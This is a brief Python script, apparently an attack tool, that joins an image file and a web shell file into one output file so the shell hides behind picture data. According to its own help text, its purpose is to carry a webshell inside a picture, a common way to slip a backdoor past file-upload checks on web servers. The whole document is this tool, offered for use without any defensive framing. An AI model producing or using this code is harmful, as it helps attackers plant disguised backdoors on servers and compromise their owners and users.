#!/usr/local/env python
#-*- coding: UTF-8 -*-

'''
Jenerate pic shell.
Usage: picshell pic shell dest_pic
'''

import argparse

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("pic",help="specified the picture file or other files to contain the webshell.")
    parser.add_argument("shell",help="specified the shell file.")
    parser.add_argument("dest",help="specified the output file.")
    args = parser.parse_args()

    with open(args.pic, "rb") as fd:
        picData = fd.read()
    with open(args.shell, "rb") as fd:
        shellData = fd.read()
    with open(args.dest, "wb") as fd:
        fd.write(picData)
        fd.write(shellData)

